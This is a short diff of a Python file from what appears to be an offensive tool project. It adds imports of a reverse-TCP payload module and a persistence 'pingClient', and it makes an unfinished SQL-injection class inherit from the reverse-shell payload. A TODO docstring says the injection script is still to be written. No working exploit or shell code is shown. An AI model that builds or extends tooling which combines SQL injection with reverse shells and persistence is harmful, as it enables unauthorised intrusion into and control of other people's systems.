@@ -1,9 +1,19 @@
 import socket as s
-import dpkt, re, urllib, sys, getopt
-from persist import pingClient as pc
-class sqlInject():
+import dpkt, re, urllib,  getopt
+import subprocess, os, platform, sys
+from SwipeDown.SwipeDown.persist import pingClient as pc
+from SwipeDown.SwipeDown.payload.Python_Reverse_TCP import reverse_tcp
+
+class sqlInject(reverse_tcp):
     tab = False
-    def removeComments(val):
+    """"
+    learn sql injection and make a script for it. 
+    @TODO
+    
+    """
+
+
+    def removecomments(self, val):
         while True:
             index = val.find("/*")
             index2 = val.find("*/")
